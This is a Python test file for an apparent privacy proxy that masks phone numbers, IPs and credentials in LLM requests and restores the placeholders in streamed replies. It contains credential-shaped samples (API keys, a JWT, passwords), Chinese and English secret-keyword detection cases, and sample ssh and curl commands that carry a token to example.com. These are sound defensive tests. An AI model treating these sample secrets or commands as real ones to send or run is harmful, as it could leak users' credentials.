        sid = "pp-hex"
        tr._new_session(sid)
        text = "上轮 {{PHONE_0123ab}} 另外 ab 也要打码"
        masked = tr.mask(text, sid)
        self.assertIn("{{PHONE_0123ab}}", masked, "已有占位符必须原样保留")
        self.assertEqual(tr.restore_final(masked, sid), text)

    def test_custom_word_equal_to_label_name(self):
        tr.CUSTOM_WORDS.update({"PHONE": "TERM"})
        tr._CUSTOM_WORD_RX_CACHE.clear()
        sid = "pp-label"
        tr._new_session(sid)
        text = "看 {{PHONE_0123ab}} 和 PHONE 字段"
        masked = tr.mask(text, sid)
        self.assertIn("{{PHONE_0123ab}}", masked)
        self.assertEqual(tr.restore_final(masked, sid), text)

    def test_malformed_placeholder_left_alone(self):
        """大写 hex / 多层花括号都不是合法占位符，但也不该被规则打中。"""
        sid = "pp-bad"
        tr._new_session(sid)
        text = "{{{{PHONE_0123ab}}}} 和 {{PHONE_0123AB}}"
        self.assertEqual(tr.mask(text, sid), text)


class SseChunkSplitRestoreTests(_RuleTestBase):
    """流式还原：占位符被切在任意 chunk 边界都必须能拼回。

    这是「同类唯一」的卖点，也最容易静默坏掉——切错一次，用户看到的就是回复里
    裸奔的 {{PHONE_66a1f6}}。用穷举而不是抽样：占位符 16-23 字符，两块 / 三块
    切分的组合才几千种，跑一遍不到一秒，没理由只测几个点。
    """

    ORIG = "客户张伟手机 13812345678，身份证 110101199003078515"

    def _masked(self, sid):
        tr._new_session(sid)
        m = tr.mask(self.ORIG, sid)
        self.assertNotEqual(m, self.ORIG, "样本必须真的被脱敏，否则用例是空转")
        return m

    def test_every_two_way_split(self):
        sid = "sse-2"
        masked = self._masked(sid)
        for i in range(len(masked) + 1):
            with self.subTest(cut=i):
                tr.sessions[sid]["pending"] = {}
                out = tr.restore(masked[:i], sid, channel="text")
                out += tr.restore(masked[i:], sid, channel="text", final=True)
                self.assertEqual(out, self.ORIG)

    def test_every_three_way_split(self):
        sid = "sse-3"
        masked = self._masked(sid)
        n = len(masked)
        for a in range(n + 1):
            for b in range(a, n + 1):
                tr.sessions[sid]["pending"] = {}
                out = tr.restore(masked[:a], sid, channel="text")
                out += tr.restore(masked[a:b], sid, channel="text")
                out += tr.restore(masked[b:], sid, channel="text", final=True)
                if out != self.ORIG:
                    self.fail("三块切分 (%d,%d) 还原错误: %r" % (a, b, out))

    def test_char_by_char_stream(self):
        """最坏情况：每个字符一个 chunk。"""
        sid = "sse-1c"
        masked = self._masked(sid)
        out = "".join(tr.restore(ch, sid, channel="text") for ch in masked)
        out += tr.restore("", sid, channel="text", final=True)
        self.assertEqual(out, self.ORIG)

    def test_channels_do_not_leak_into_each_other(self):
        """正文 delta 与 tool 参数 delta 共用缓冲会把上一个字段的尾巴吐进下一个。"""
        sid = "sse-ch"
        masked = self._masked(sid)
        head = tr.restore(masked[:12], sid, channel="text")
        tool = tr.restore("独立通道 " + masked, sid, channel="tool", final=True)
        tail = tr.restore(masked[12:], sid, channel="text", final=True)
        self.assertEqual(head + tail, self.ORIG)
        self.assertEqual(tool, "独立通道 " + self.ORIG)


class PriceCatalogMatchingTests(unittest.TestCase):
    """在线价格目录的模型名匹配（2026-08-15 实测「同步了但没生效」后补）。

    目录来自 OpenRouter，key 带厂商前缀（`deepseek/deepseek-chat`）；而真实流量
    的 model 字段是裸名（`deepseek-chat`）。原来只做精确匹配，两边永远对不上——
    389 条目录一条都命中不了，全部退回 36 条内置表，用户体感就是
    「你不发版我就用不上新模型」。这组用例锁死匹配顺序和归一规则。
    """

    CATALOG = {
        "openai/gpt-4o": {"input": 2.5, "output": 10.0},
        "anthropic/claude-sonnet-4-5": {"input": 3.0, "output": 15.0},
        "anthropic/claude-3.5-haiku": {"input": 0.8, "output": 4.0},
        "deepseek/deepseek-chat": {"input": 0.2574, "output": 1.0287},
        "azure/gpt-4o": {"input": 9.9, "output": 9.9},   # 同名不同厂商，用来验确定性
    }

    def _cost(self, model, **kw):
        # 每个用例传新 dict，避免 _bare_price_index 的身份缓存跨用例复用
        return sd.estimate_cost(model, 1_000_000, 0, cache=dict(self.CATALOG), **kw)

    def test_bare_model_name_hits_catalog(self):
        """真实流量的常态：没有厂商前缀。"""
        cost, price = self._cost("deepseek-chat")
        self.assertEqual(price, self.CATALOG["deepseek/deepseek-chat"])
        self.assertAlmostEqual(cost, 0.2574, places=4)

    def test_prefixed_model_name_still_hits(self):
        _, price = self._cost("deepseek/deepseek-chat")
        self.assertEqual(price, self.CATALOG["deepseek/deepseek-chat"])

    def test_dot_and_dash_are_equivalent(self):
        """Anthropic 官方写 claude-3-5-haiku，OpenRouter 写 claude-3.5-haiku。"""
        _, price = self._cost("claude-3-5-haiku")
        self.assertEqual(price, self.CATALOG["anthropic/claude-3.5-haiku"])

    def test_date_suffix_falls_back_to_longest_prefix(self):
        """claude-3-5-haiku-20241022 要能命中 claude-3.5-haiku。"""
        _, price = self._cost("claude-3-5-haiku-20241022")
        self.assertEqual(price, self.CATALOG["anthropic/claude-3.5-haiku"])

    def test_same_bare_name_different_vendor_is_deterministic(self):
        """azure/ 排在 openai/ 前面，按 key 排序取第一个——结果必须每次一样。"""
        first = self._cost("gpt-4o")[1]
        for _ in range(3):
            self.assertEqual(self._cost("gpt-4o")[1], first)
        self.assertEqual(first, self.CATALOG["azure/gpt-4o"])

    def test_overrides_beat_catalog(self):
        _, price = self._cost("gpt-4o", overrides={"gpt-4o": {"input": 99.0, "output": 1.0}})
        self.assertEqual(price["input"], 99.0)

    def test_catalog_beats_builtin_table(self):
        """内置表是断网兜底，不该抢在线目录的路。"""
        _, price = self._cost("claude-sonnet-4-5")
        self.assertEqual(price, self.CATALOG["anthropic/claude-sonnet-4-5"])

    def test_builtin_dotted_keys_still_match_offline(self):
        """内置表有 10 个带点号的 key；归一化后不能把它们弄丢。"""
        for model in ["gpt-4.1", "gpt-4-1", "gemini-1.5-flash", "glm-4.5"]:
            with self.subTest(model=model):
                cost, price = sd.estimate_cost(model, 1_000_000, 0, cache=None)
                self.assertIsNotNone(price, f"{model} 断网时应命中内置表")
                self.assertGreater(cost, 0)

    def test_unknown_model_returns_none(self):
        """未收录必须显式返回 None，让前端显示「未定价」，绝不猜一个价出来。"""
        cost, price = self._cost("某中转私有模型-x")
        self.assertIsNone(price)
        self.assertEqual(cost, 0.0)

    def test_empty_and_malformed_model(self):
        for model in ["", None, "   ", "/"]:
            with self.subTest(model=model):
                self.assertEqual(self._cost(model), (0.0, None))


class LongSessionRestoreTests(_RuleTestBase):
    """长会话占位符还原（2026-08-15 实测复现「还原功能坏了」后补）。

    复用表原来跟着 SESSION_TTL（出厂 600s）过期。agent 类客户端一个任务跑几十
    分钟，上下文里始终带着几十轮前的占位符——10 分钟一到映射就没了，模型回复里
    的占位符查不到原文、原样透传给客户端，agent 拿着 `{{IPPRIVATE_xxx}}` 去执行，
    命令必然失败。用户看到的现象是「脱敏还原逻辑失效」，实际是映射提前过期。
    """

    def _age_recent(self, seconds):
        """把复用表时间戳往前拨，模拟经过 N 秒（不真的 sleep）。"""
        past = time.time() - seconds
        for table in (tr._RECENT_FWD, tr._RECENT_REV):
            for v in table.values():
                v[2] = past

    def _masked_command(self, sid):
        tr._new_session(sid)
        masked = tr.mask("ssh tanmw@100.118.224.56", sid)
        self.assertIn("{{", masked, "样本必须真的被脱敏")
        return "ssh tanmw@%s 'ls /opt'" % masked.split("@")[1]

    def test_reuse_table_ttl_is_independent_of_session_ttl(self):
        """两个 TTL 必须解耦：会话回收快是为了省内存，映射保留久是为了能还原。"""
        tr.SESSION_TTL = 600
        self.assertGreaterEqual(tr._recent_ttl(), 24 * 3600)

    def _restore_in_fresh_session(self, cmd, sid):
        """在一个全新会话里还原。

        必须先 _new_session：restore() 对查不到的 sid 直接原样返回，
        不建会话就等于测了个寂寞（第一版用例就栽在这，全绿才是假的）。
        """
        tr._new_session(sid)
        return tr.restore_final(cmd, sid)

    def test_restore_survives_session_eviction(self):
        """会话被回收 + 已过 SESSION_TTL，历史占位符仍要还原得回来。"""
        tr.SESSION_TTL = 600
        cmd = self._masked_command("long-1")
        for elapsed, label in [(700, "12 分钟"), (3600, "1 小时"),
                               (8 * 3600, "8 小时"), (23 * 3600, "23 小时")]:
            with self.subTest(elapsed=label):
                self._age_recent(elapsed)
                tr.sessions.pop("long-1", None)
                out = self._restore_in_fresh_session(cmd, "fresh-%d" % elapsed)
                self.assertNotIn("{{", out, f"{label}后占位符不该原样透传")
                self.assertIn("100.118.224.56", out)

    def test_expires_eventually(self):
        """也不能永不过期——原文在内存里的保留窗口必须有上界。"""
        tr.SESSION_TTL = 600
        cmd = self._masked_command("long-2")
        self._age_recent(25 * 3600)
        tr.sessions.pop("long-2", None)
        out = self._restore_in_fresh_session(cmd, "fresh-expired")
        self.assertIn("{{", out, "超过复用表 TTL 后应停止还原")

    def test_user_raised_session_ttl_is_respected(self):
        """用户把 session_ttl 调到 48h 时，复用表要跟着放宽而不是卡在 24h。"""
        tr.SESSION_TTL = 48 * 3600
        self.assertEqual(tr._recent_ttl(), 48 * 3600)

    def test_unresolved_placeholder_is_counted(self):
        """还原不了时必须计数，否则这类故障在日志里完全看不见。"""
        tr.SESSION_TTL = 600
        cmd = self._masked_command("long-3")
        self._age_recent(25 * 3600)
        tr.sessions.pop("long-3", None)
        sid = "fresh-count"
        tr._new_session(sid)
        tr.restore_final(cmd, sid)
        self.assertEqual(tr.sessions[sid].get("unresolved"), 1)

    def test_reuse_table_never_persisted(self):
        """复用表里是原文明文。落盘就等于把凭据写进磁盘，与红线冲突。"""
        tr_file = (ROOT / "engine" / "transparent.py") if (ROOT / "engine" / "transparent.py").exists() else (ROOT / "transparent.py")
        src = tr_file.read_text(encoding="utf-8")
        for table in ("_RECENT_FWD", "_RECENT_REV"):
            for verb in ("write_text", "json.dump", "pickle"):
                self.assertNotIn(f"{verb}({table}", src)


    def test_restore_side_hit_extends_ttl(self):
        """滑动过期：只被还原、不再被脱敏的映射也要续期。

        原来只有 mask 侧 _recall_token 刷时间戳。一个原文在对话开头出现一次之后
        再没被 mask 过，但模型每轮复述它的占位符——映射明明一直在用，时间戳却停在
        第一次，绝对时间一到照样清掉，整段历史的该占位符全部还原不了。
        """
        tr.SESSION_TTL = 600
        cmd = self._masked_command("slide-1")
        for round_no in range(1, 6):
            with self.subTest(round=round_no):
                self._age_recent(20 * 3600)   # 距上次活动 20 小时
                tr.sessions.pop("slide-1", None)
                out = self._restore_in_fresh_session(cmd, "slide-fresh-%d" % round_no)
                self.assertNotIn("{{", out, f"第 {round_no} 次复述（累计 {round_no*20}h）应仍能还原")

    def test_touch_refreshes_both_directions(self):
        """_prune_recent 按 _RECENT_FWD 的时间戳扫，只刷 REV 会被连带删掉。"""
        tr.SESSION_TTL = 600
        cmd = self._masked_command("slide-2")
        self._age_recent(20 * 3600)
        tr.sessions.pop("slide-2", None)
        self._restore_in_fresh_session(cmd, "slide-touch")
        now = time.time()
        for table, name in ((tr._RECENT_FWD, "_RECENT_FWD"), (tr._RECENT_REV, "_RECENT_REV")):
            for v in table.values():
                self.assertLess(now - v[2], 60, f"{name} 命中后应被续期")

    def test_idle_still_expires(self):
        """续期只对「有命中」生效；真的没人用就该到点过期。"""
        tr.SESSION_TTL = 600
        cmd = self._masked_command("slide-3")
        self._age_recent(25 * 3600)
        tr.sessions.pop("slide-3", None)
        out = self._restore_in_fresh_session(cmd, "slide-idle")
        self.assertIn("{{", out, "无命中且超时后必须过期")


class RequestCoverageTests(_RuleTestBase):
    """脱敏覆盖面：不是只有对话内容。

    system 提示词、工具定义、tool_use 参数、tool_result 返回、metadata——
    这些才是 agent 场景下泄漏量最大的地方（工具去读数据库/文档，结果整段进请求体）。
    协议字段（tool name / tool_use_id）必须原样保留，改了客户端直接崩。
    """

    IP = "100.118.224.56"
    PHONE = "13812345678"

    def _send(self):
        tr.CUSTOM_WORDS.update({"星火项目": "PROJECT"})
        tr._CUSTOM_WORD_RX_CACHE.clear()
        tr.UPSTREAMS = list(tr.DEFAULT_UPSTREAMS)
        tr.CAPTURE_MODE = "reverse"
        body = {
            "model": "claude-opus-5",
            "system": [{"type": "text",
                        "text": f"生产服务器 {self.IP}，负责人 {self.PHONE}，项目 星火项目。"}],
            "tools": [{"name": "ssh_exec", "description": f"在 {self.IP} 上执行命令",
                       "input_schema": {"type": "object",
                                        "properties": {"host": {"type": "string", "default": self.IP}}}}],
            "messages": [
                {"role": "user", "content": f"联系 {self.PHONE}"},
                {"role": "assistant", "content": [
                    {"type": "tool_use", "id": "tu_1", "name": "ssh_exec",
                     "input": {"host": self.IP, "cmd": f"grep {self.PHONE} /var/log/app.log"}}]},
                {"role": "user", "content": [
                    {"type": "tool_result", "tool_use_id": "tu_1",
                     "content": f"匹配到 星火项目 用户 {self.PHONE}，来自 {self.IP}"}]},
            ],
            "metadata": {"user_id": f"user-{self.PHONE}"},
        }
        flow = SimpleNamespace(
            request=SimpleNamespace(
                pretty_host="anthropic.com", path="/v1/messages", method="POST",
                headers={"content-type": "application/json"},
                content=json.dumps(body, ensure_ascii=False).encode(),
                host="anthropic.com", port=443, scheme="https"),
            response=None, metadata={},
            client_conn=SimpleNamespace(sockname=("127.0.0.1", 18703)))
        old_reload, old_emit = tr._maybe_reload, tr._emit
        try:
            tr._maybe_reload = lambda force=False: None
            tr._emit = lambda *a, **k: None
            tr.request(flow)
        finally:
            tr._maybe_reload, tr._emit = old_reload, old_emit
        return json.loads(flow.request.content)

    def test_no_secret_survives_anywhere_in_body(self):
        """整个请求体做一次全文扫描——任何角落都不许留原文。"""
        sent = json.dumps(self._send(), ensure_ascii=False)
        for name, value in [("内网 IP", self.IP), ("手机号", self.PHONE), ("项目代号", "星火项目")]:
            with self.subTest(field=name):
                self.assertNotIn(value, sent, f"{name} 泄漏到出网内容里")

    def test_each_region_is_masked(self):
        sent = self._send()
        regions = {
            "system": sent["system"],
            "tools[].description": sent["tools"][0]["description"],
            "tools[].input_schema": sent["tools"][0]["input_schema"],
            "messages": sent["messages"][0],
            "tool_use.input": sent["messages"][1]["content"][0]["input"],
            "tool_result": sent["messages"][2]["content"][0],
            "metadata": sent.get("metadata"),
        }
        for name, region in regions.items():
            with self.subTest(region=name):
                blob = json.dumps(region, ensure_ascii=False)
                self.assertNotIn(self.IP, blob)
                self.assertNotIn(self.PHONE, blob)

    def test_protocol_fields_untouched(self):
        """工具名和 tool_use_id 是协议标识，客户端要拿它配对，脱敏就崩。"""
        sent = self._send()
        self.assertEqual(sent["tools"][0]["name"], "ssh_exec")
        self.assertEqual(sent["messages"][1]["content"][0]["id"], "tu_1")
        self.assertEqual(sent["messages"][2]["content"][0]["tool_use_id"], "tu_1")


class CredentialPreviewTests(unittest.TestCase):
    """凭据预览：可识别，不可用（2026-08-15 用户反馈后重做）。

    原来所有凭据一律 `****`。红线守住了（日志拿走也拿不到 key），但走到了另一个
    极端——用户看到「密钥泄露」却不知道是哪一把，没法去吊销，等于没有安全能力。
    现在按熵分档，并保证任何一档都拿不到可用的凭据。
    """

    HIGH = [
        ("API_KEY", "sk-proj-Zz9Yy8Xx7Ww6Vv5Uu4Tt3Ss2Rr1Qq0Pp", "sk-proj-"),
        ("API_KEY", "ghp_" + "1234567890abcdefghijklmnopqrstuvwx", "ghp_"),
        ("ACCESS_KEY", "AKIA" + "IOSFODNN7EXAMPLE", "AKIA"),
        ("ACCESS_KEY", "AKID" + "z8krbsJ5yKBZQpn74WFkmLPx3gnPhESA", "AKID"),
        ("TOKEN", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcdefghijkl", "eyJ"),
    ]

    def test_high_entropy_shows_prefix_and_tail(self):
        """结构前缀是公开格式标记，末 4 位与各家控制台的显示方式一致。"""
        for label, secret, prefix in self.HIGH:
            with self.subTest(label=label, prefix=prefix):
                pv = tr._preview(secret, label)
                self.assertTrue(pv.startswith(prefix), f"{pv} 应以 {prefix} 开头")
                self.assertTrue(pv.endswith(secret[-4:]), f"{pv} 应以末 4 位结尾")

    def test_no_preview_contains_full_secret(self):
        """任何一档都不能把完整凭据放进预览。"""
        for label, secret, _ in self.HIGH:
            with self.subTest(label=label):
                self.assertNotEqual(tr._preview(secret, label).replace("…", ""), secret)

    def test_middle_is_never_exposed(self):
        """中间段必须完全缺失——这是「可识别」与「可用」之间的那条线。"""
        secret = "sk-proj-Zz9Yy8Xx7Ww6Vv5Uu4Tt3Ss2Rr1Qq0Pp"
        pv = tr._preview(secret, "API_KEY")
        self.assertNotIn(secret[10:30], pv)
        self.assertLess(len(pv.replace("…", "")), len(secret) / 2)

    def test_low_entropy_password_shows_no_characters(self):
        """人选的口令常常只有 8-12 位，露首尾就等于露大半，一个字符都不给。"""
        for label, secret in [("SECRET", "Sup3rS3cret"), ("CONNSTR", "p@ssw0rd123")]:
            with self.subTest(label=label):
                pv = tr._preview(secret, label)
                for ch in set(secret):
                    if ch.isalnum():
                        self.assertNotIn(secret[:3], pv, "低熵口令不得出现任何原文片段")
                self.assertIn(str(len(secret)), pv, "但要给出长度，便于判断是哪一类口令")

    def test_short_credential_falls_back_to_no_characters(self):
        """够短的高熵凭据也按低熵处理——20 位以下露 8 位太多。"""
        pv = tr._preview("short123", "API_KEY")
        self.assertNotIn("short", pv)

    def test_private_key_shows_only_type(self):
        """私钥是最高危的，任何一段都不能露，只给类型 + 长度（对标 SSH fingerprint）。"""
        for kind in ("RSA", "EC", "OPENSSH"):
            with self.subTest(kind=kind):
                pem = f"-----BEGIN {kind} PRIVATE KEY-----\nMIIEowIBAAKCAQEAsecret\n-----END {kind} PRIVATE KEY-----"
                pv = tr._preview(pem, "PRIVATE_KEY")
                self.assertIn(kind, pv)
                self.assertNotIn("MIIEow", pv, "私钥本体一个字节都不能进日志")
                self.assertNotIn("secret", pv)

    def test_digest_is_stable_and_irreversible(self):
        """digest 是精确定位手段：本地对手上的 key 算一次 sha256 就能比对。"""
        a = tr._cred_digest("sk-proj-AAAA")
        self.assertEqual(a, tr._cred_digest("sk-proj-AAAA"), "同一凭据摘要必须稳定")
        self.assertNotEqual(a, tr._cred_digest("sk-proj-AAAB"), "不同凭据摘要必须不同")
        self.assertNotIn("sk-proj", a)
        self.assertEqual(len(a), 16)

    def test_non_credential_labels_keep_context(self):
        """普通 PII 不走凭据分支——手机号要能看出是哪个号段。"""
        self.assertNotEqual(tr._preview("13812345678", "PHONE"), "<PHONE 11 位>")


class LoosePlaceholderRestoreTests(_RuleTestBase):
    """模型把占位符改坏后的兜底还原（2026-08-15 真实调用复现后加）。

    实测（deepseek-v4-flash 真实请求）：让模型把脱敏后的 token 拼进一条 curl，
    它输出的是 `X-Setup-Token: SECRET_b5a53c` —— 花括号被剥掉了。
    原因很直白：{{...}} 在 Jinja/Handlebars/Vue 里就是模板语法，模型写命令时
    会顺手"整理"掉。严格正则匹配不到 → 还原整个跳过 → 用户拿到一个假 token
    去执行，而且毫无察觉。

    兜底只修「我们自己发过的 token」（查得到原文才替换），所以没有误伤空间。
    """

    SECRET = "9qIR18zm_ZNUy5HsvCs5FolQkvPMY9tr"

    def _mint(self, sid="loose"):
        tr._new_session(sid)
        masked = tr.mask(f"SETUP TOKEN: {self.SECRET}", sid)
        self.assertIn("{{", masked, "样本必须真的被脱敏")
        tok = masked.split(": ", 1)[1]
        return sid, tok, tok.strip("{}")

    def _restore(self, sid, text):
        s = tr.sessions[sid]
        s["restored"] = s["degraded"] = s["unresolved"] = 0
        return tr.restore_final(text, sid), s

    def test_braces_stripped_is_repaired(self):
        """实测形态：花括号被完全剥掉。"""
        sid, _, bare = self._mint()
        out, s = self._restore(sid, f'curl -H "X-Setup-Token: {bare}" https://example.com/api/setup')
        self.assertIn(self.SECRET, out)
        self.assertEqual(s["degraded"], 1, "靠兜底修回来的必须计数")

    def test_half_braces_are_repaired(self):
        for tmpl in ("值是 {{%s 用它", "值是 %s}} 用它"):
            with self.subTest(tmpl=tmpl):
                sid, _, bare = self._mint("loose-half")
                out, _ = self._restore(sid, tmpl % bare)
                self.assertIn(self.SECRET, out)

    def test_bare_form_inside_json(self):
        sid, _, bare = self._mint("loose-json")
        out, _ = self._restore(sid, '{"token": "%s"}' % bare)
        self.assertEqual(json.loads(out)["token"], self.SECRET)

    def test_intact_placeholder_still_counts_as_normal(self):
        """完好的占位符走第一遍严格匹配，不该被计成 degraded。"""
        sid, tok, _ = self._mint("loose-ok")
        out, s = self._restore(sid, f"提交 {tok}")
        self.assertIn(self.SECRET, out)
        self.assertEqual(s["degraded"], 0)

    def test_unknown_lookalikes_are_never_touched(self):
        """没发过的 token 一律原样放过——这是兜底不误伤的唯一保证。"""
        tr._new_session("loose-fp")
        for text in ["版本 ABC_123456", "变量 MAX_a1b2c3", "日志 ERROR_ff00aa 出现",
                     "{{FAKE_abcdef}}", "路径 /var/LOG_012345"]:
            with self.subTest(text=text):
                self.assertEqual(tr.restore_final(text, "loose-fp"), text)

    def test_degraded_is_reported_separately_from_restored(self):
        """用户要能在日志里看出「这次是靠兜底救回来的」，而不是一切正常。"""
        sid, _, bare = self._mint("loose-count")
        _, s = self._restore(sid, f"a {bare} b")
        self.assertEqual(s["restored"], 1)
        self.assertEqual(s["degraded"], 1)


class ChineseCredentialContextTests(unittest.TestCase):
    """中文语境下的凭据脱敏（SHIELD-CRED-CJK-001，2026-08-15 真实调用实测发现）。

    发现过程值得记下来：单测和英文场景的真实调用都过了（SETUP TOKEN: xxx 正常脱敏），
    但把同一个令牌换成中文提示「安装令牌：xxx」后，真实上游的模型 reasoning 里
    直接出现了明文令牌——SECRET 规则只认英文关键词 + 半角 [:=]，中文用户写的
    「密码：」「令牌：」「密钥：」一律不触发，凭据整条原文上行。

    这是面向中文用户的产品，中文提示词才是主场景，所以这组用例按「应命中/不应命中」
    两侧都锁。误报侧尤其重要：值的字符类不含汉字，正常中文句子（「密码：请联系管理员」）
    绝不能被切。
    """

    def setUp(self):
        tr.sessions.clear()
        tr.CUSTOM_WORDS.clear()
        tr._CUSTOM_WORD_RX_CACHE.clear()
        tr.BUILTIN_RULES = {l: True for l in tr.DEFAULT_BUILTIN_RULES}
        tr.SENSITIVE_DISABLED = set()
        tr.SENSITIVE_WORD_DISABLED = {}

    def _mask(self, text, tag):
        sid = f"cjk-{tag}"
        tr._new_session(sid)
        return tr.mask(text, sid)

    def test_chinese_credential_keywords_are_masked(self):
        """中英文关键词 × 半角/全角分隔符的组合都要命中。"""
        cases = {
            "英文半角": "SETUP TOKEN: 9qIR18zm_ZNUy5HsvCs5FolQkvPMY9tr",
            "令牌全角": "安装令牌：9qIR18zm_ZNUy5HsvCs5FolQkvPMY9tr",
            "令牌半角": "安装令牌: 9qIR18zm_ZNUy5HsvCs5FolQkvPMY9tr",
            "密码全角": "数据库密码：Pa55w0rd!secure",
            "密钥全角": "API 密钥：ak_live_9qIR18zmZNUy5Hs",
            "口令全角": "登录口令：Adm1n@2026x",
            "授权码全角等号": "授权码＝LIC-2026-ABCD99",
            "凭证": "凭证：tok_9aZ8x7Y6w5",
        }
        for tag, text in cases.items():
            with self.subTest(case=tag):
                out = self._mask(text, tag)
                self.assertIn("{{SECRET_", out, f"{tag} 未脱敏：{out}")

    def test_normal_chinese_text_is_not_masked(self):
        """误报侧：正常中文句子、代码、URL、时间都不许被切。"""
        cases = {
            "无值说明": "密码：请联系管理员重置",
            "待发放": "令牌：稍后由运维发放",
            "成员访问": "ModelUtils.toStringSafe(x)",
            "纯字母标识符": "secret: CamelCaseName",
            "URL路径": "token: /api/v1/refresh",
            "会议时间": "会议时间：14:30 开始",
            "中文冒号数字": "共计：128 条记录",
        }
        for tag, text in cases.items():
            with self.subTest(case=tag):
                out = self._mask(text, tag)
                self.assertNotIn("{{", out, f"{tag} 误报：{out}")

    def test_full_width_separator_is_in_rule_markers(self):
        """全角分隔符必须出现在预检 marker 里。

        _rule_may_hit 用 marker 做快速预检，marker 命不中就整条规则跳过——
        正则改对了但忘了加 marker，等于没改（CGNAT 规则踩过同一个坑）。
        """
        markers = tr._RULE_MARKERS["SECRET"]
        self.assertIn("：", markers)
        self.assertIn("＝", markers)

    def test_restore_returns_exact_original(self):
        """脱敏后还原必须逐字还原，不能把全角标点或引号一起吞掉。"""
        text = "安装令牌：9qIR18zm_ZNUy5HsvCs5FolQkvPMY9tr，请妥善保管"
        sid = "cjk-roundtrip"
        tr._new_session(sid)
        masked = tr.mask(text, sid)
        self.assertNotIn("9qIR18zm", masked)
        self.assertEqual(tr.restore_final(masked, sid), text)


class UnknownBodyShapeTests(unittest.TestCase):
    """请求体形态不认识时不得原文透传（SHIELD-SHAPE-WHITELIST-001 /
    SHIELD-NONOBJECT-BYPASS-001，2026-08-15 外部审计 + 形态实测发现）。

    原实现用 _LLM_BODY_KEYS 白名单判断「像不像 LLM 请求」，不像就 PASS 不脱敏；
    顶层非对象 JSON 更是在白名单判断之前就直接放行。实测这两条路合起来会让
    Cohere v1 chat（message 单数）、Bedrock Titan（inputText）、讯飞星火
    （payload.message.text）、以及 ["手机号 138…"] 这种数组体整包原文上行。

    白名单追不上新协议，所以判定反过来：请求已经落在用户显式配置的上游路由上
    （reverse 模式的必经之路）+ fail_closed 时，形态不认识也照常脱敏。
    这组用例锁的就是「上游收到的字节里不许出现原文」。
    """

    PHONE = "13800138000"

    def setUp(self):
        tr.sessions.clear()
        tr.CUSTOM_WORDS.clear()
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        tr._CUSTOM_WORD_RX_CACHE.clear()
        tr.UPSTREAMS = list(tr.DEFAULT_UPSTREAMS)
        tr.CAPTURE_MODE = "reverse"
        tr.FAIL_CLOSED = True
        tr.FILTER_ENABLED = True

    def _send(self, body):
        """把 body 通过 request() 发一次，返回真正发往上游的字节。"""
        flow = SimpleNamespace(
            request=SimpleNamespace(
                pretty_host="api.openai.com", path="/v1/chat/completions", method="POST",
                headers={"content-type": "application/json"},
                content=json.dumps(body, ensure_ascii=False).encode("utf-8"),
                host="api.openai.com", port=5802, scheme="http",
            ),
            response=None, metadata={},
            client_conn=SimpleNamespace(sockname=("127.0.0.1", 18701)),
        )
        old_reload, old_emit = tr._maybe_reload, tr._emit
        try:
            tr._maybe_reload = lambda force=False: None
            tr._emit = lambda *a, **k: None
            tr.request(flow)
        finally:
            tr._maybe_reload, tr._emit = old_reload, old_emit
        return flow.request.content.decode("utf-8"), flow

    def test_no_known_shape_leaks_plaintext_upstream(self):
        """逐个真实协议形态过一遍：上游拿到的字节里一律不许有原文手机号。"""
        shapes = {
            "OpenAI chat": {"model": "g", "messages": [{"role": "user", "content": self.PHONE}]},
            "Anthropic": {"model": "c", "system": self.PHONE, "messages": []},
            "Gemini": {"contents": [{"parts": [{"text": self.PHONE}]}]},
            "Responses API": {"model": "o", "input": self.PHONE},
            "Ollama": {"model": "l", "prompt": self.PHONE},
            "Cohere v1 chat": {"model": "cmd", "message": self.PHONE, "chat_history": []},
            "Bedrock Titan": {"inputText": self.PHONE},
            "讯飞星火": {"payload": {"message": {"text": [{"role": "user", "content": self.PHONE}]}}},
            "HuggingFace": {"inputs": self.PHONE},
            "自定义业务对象": {"customer": {"phone": self.PHONE}},
            "顶层数组": [self.PHONE],
            "顶层字符串": self.PHONE,
            "顶层嵌套数组": [{"note": self.PHONE}],
        }
        for name, body in shapes.items():
            with self.subTest(shape=name):
                sent, _ = self._send(body)
                self.assertNotIn(self.PHONE, sent, f"{name} 形态原文上行")
                self.assertIn("{{", sent, f"{name} 形态没有产生占位符")

    def test_non_object_root_keeps_its_json_shape(self):
        """脱敏用的合成根键只能存在于进程内，上游必须仍收到原来的顶层形态。"""
        for body, kind in (([self.PHONE], list), (self.PHONE, str)):
            with self.subTest(kind=kind.__name__):
                sent, _ = self._send(body)
                self.assertNotIn(tr._ROOT_WRAP_KEY, sent, "合成根键泄漏到上游")
                self.assertIsInstance(json.loads(sent), kind, "顶层形态被改变")

    def test_masked_non_object_root_restores(self):
        """非对象体脱敏后，响应侧仍要能还原回真值（会话链路没断）。"""
        sent, flow = self._send([self.PHONE])
        sid = flow.metadata.get("session_id")
        self.assertTrue(sid, "非对象体没有建立会话，响应侧无法还原")
        token = json.loads(sent)[0]
        self.assertEqual(tr.restore_final(token, sid), self.PHONE)

    def test_unknown_shape_passes_through_when_fail_closed_off(self):
        """用户主动关掉 fail_closed 时保持旧行为，不把普通业务接口也改了。"""
        tr.FAIL_CLOSED = False
        sent, _ = self._send({"customer": {"phone": self.PHONE}})
        self.assertIn(self.PHONE, sent, "关闭 fail_closed 后不应改写非 LLM 请求")


class ConfigHotReloadFieldTests(unittest.TestCase):
    """配置热重载字段断链（SHIELD-RELOAD-SIGNALS-001，2026-08-15 外部审计发现）。

    故障形态最阴险的地方在于「单测全绿、生产静默失效」：
    _read_settings 里另抄了一份硬编码的信号键列表，加 S8/S9 时只改了模块级
    DEFAULT，没改这份抄件。进程刚起来时 AUDIT_SIGNALS 是 9 键的，一切正常；
    等用户在面板上改任何一项配置触发热重载，AUDIT_SIGNALS 被整体替换成 7 键
    字典，S8/S9 从此再不触发——而所有单测都只测刚导入的模块状态，测不到这一步。

    同一批还有 sensitive_word_whole：既没在 _read_settings 里返回，_maybe_reload
    里的赋值也漏了 global 声明（写成了局部变量），UI 的「整词匹配」开关全程无效。

    这里锁死三条不变式，任何一条破了就说明又出现了同类断链。
    """

    @staticmethod
    def _reload_with(cfg_dict):
        """把引擎的数据目录指向一份临时 config.json 并强制热重载。

        改 _DATA_ROOT 是全局副作用，调用方负责在 finally 里还原。
        """
        d = Path(tempfile.mkdtemp())
        (d / "config.json").write_text(
            json.dumps(cfg_dict, ensure_ascii=False), encoding="utf-8"
        )
        tr._DATA_ROOT = d
        tr._cfg_mtime[0] = 0.0
        tr._maybe_reload(force=True)

